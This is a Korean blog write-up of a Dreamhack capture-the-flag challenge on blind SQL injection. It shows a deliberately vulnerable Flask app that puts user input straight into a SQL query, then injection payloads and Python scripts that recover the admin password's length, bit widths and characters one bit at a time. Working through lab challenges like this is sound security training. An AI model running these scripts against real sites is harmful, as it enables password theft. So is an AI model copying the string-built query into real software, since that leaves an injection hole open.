---
title: (23) Dreamhack blind sql injection advanced 문제풀이
date: 2024-01-29 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
관리자의 비밀번호는 "아스키코드"와 "한글"로 구성되어 있습니다.

## 문제 풀이
사이트를 들어가 보면 이런 사이트가 나옵니다.
![](https://kyuyeop.github.io/assets/img/post/23/1.png)
코드를 확인해 겠습니다.
```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
짧은 코드인데, 입력한 값의 uid를 갖는 유저가 있다면 `user "{uid}" exists.`가 나오도록 되어 있습니다. 결과가 없거나 에러가 나면 아무것도 반환하지 않네요.  
  
쿼리 결과의 반환이 없으므로 blind sqli을 사용해야 합니다. blind sqli에서 가장 먼저 하는건 추출하고자하는 글자가 몇 글자인지 알아내는 작업 입니다.
  
이때 우리가 사용할 것은 `char_length`함수입니다. 왜 그냥 `length`가 아니라 `char_length`를 쓰는가 하면 바로 한글이 포함되어 있기 때문입니다. 그냥 `length`는 몇 바이트인지를 반환하는 함수라, ascii 범위의 글자라면 `char_length`와 똑같지만, 한글은 최대 3바이트 이므로 `char_length`를 써야 정확히 몇 글자인지 정확히 알 수 있습니다.  
  
먼저 글자수를 알아내는 방법입니다. 사용할 sqli 구문은 다음과 같습니다.
```
admin' and char_length(upw)={length}#
```
그럼 최종적으로 서버에서 실행될 sql구문은 이렇게 됩니다.
```sql
SELECT * FROM users WHERE uid='admin' and char_length(upw)={length}#'
```
해석하면 "`uid`가 `admin`이고 `upw`의 길이가 변수 `length`인 데이터(들)을 users 테이블에서 가져온다" 입니다.

`{length}` 자리에 값을 바꿔가면서 넣으면 응답에 따라 길이를 알아낼 수 있겠죠. 저는 while문을 돌려서 숫자를 1씩 높여가면 넣어보았습니다.  
응답에 sql 결과가 있을 경우 나오는 `exists`라는 문자열이 있는지 여부로 참, 거짓을 구별했습니다.  
  
완성한 파이썬 코드는 아래와 같습니다.
```python
import requests

host = 'http://host3.dreamhack.games:13894'

length = 0
while 'exists' not in requests.get(host, {"uid":f"admin' and char_length(upw)={length}#"}).text:
    length += 1
print(length)
```
실제로 이걸 돌려보면 13이 나옵니다. 총 13글자라는 뜻이죠.  
  
그럼 이어서 각 자리 글자를 맞춰야 하는데, 어떤 글자가 한글인지 알 수 없으니 아무렇게나 막 때려넣어 볼수도 없는 노릇이죠.  
그래서 일단 각 글자가 몇 비트인지 알아봅시다. 각 글자가 몇 비트인지 알면 한글인지 영어(ascii)인지 알 수도 있고, 나중에 비트를 때려넣어볼때도 사용할 수 있습니다.  
이번에 사용할 sqli문입니다.
```
admin' and length(bin(ord(substr(upw,{i},1))))={j}#
```
서버에서 실행되는건 아래와 같겠죠.
```sql
SELECT * FROM users WHERE uid='admin' and length(bin(ord(substr(upw,{i},1))))={j}
```
먼저 `substr`함수로 한 글자씩 자른다음, 정수로 변환하고, 그걸 다시 바이너리로 변환합니다. 그게 `j`와 같은지 확인하는거죠. 이걸 1~13까지의 `i`값에 대해 전부 실행해봅니다. 이를 구현한 코드는 아래와 같습니다.
```python
bits = []
for i in range(1,length + 1):
    j = 1
    while 'exists' not in requests.get(host, {"uid":f"admin' and length(bin(ord(substr(upw,{i},1))))={j}#"}).text:
        j += 1
    bits.append(j)
print(bits)
```
이걸 실행하면 `[7, 7, 7, 24, 24, 24, 24, 24, 24, 24, 6, 6, 7]` 가 결과로 나옵니다.  
  
그럼 이제 실제 비밀번호를 추출할 시간입니다.  

여기서도 비트를 이용합니다.  
왜냐하면 정수를 사용하면 `2^비트 수` 만큼의 연산이 필요하지만, 그냥 비트를 사용해서 구하면 `비트 수` 만큼의 연산으로 충분하니까요.  
이번에 사용할 구문입니다.
```
admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)=1
```
서버에선 다음이 실행됩니다.
```sql
SELECT * FROM users WHERE uid='admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)=1
```
바이너리 값을 다시 1글자씩 잘라서 1인지 비교하는 방식입니다.  
그렇게 한 글자씩 비트를 구하고, 그걸 utf-8로 변환해서 출력하도록 만들었습니다.
```python
for i in range(1, len(bits) + 1):
    bit = ''
    for j in range(1, bits[i - 1] + 1):
        if 'exists' in requests.get(host,{"uid":f"admin' and substr(bin(ord(substr(upw,{i},1))),{j},1)=1#"}).text:
           bit += '1'
        else:
            bit += '0'
    print(int(bit, 2).to_bytes(3, 'big').decode('utf-8'), end='')
```
이 코드를 전부 실행하게 되면
```
DH{이것이비밀번호!?}
```
라는 flag를 얻을 수 있게 됩니다.
{% endraw %}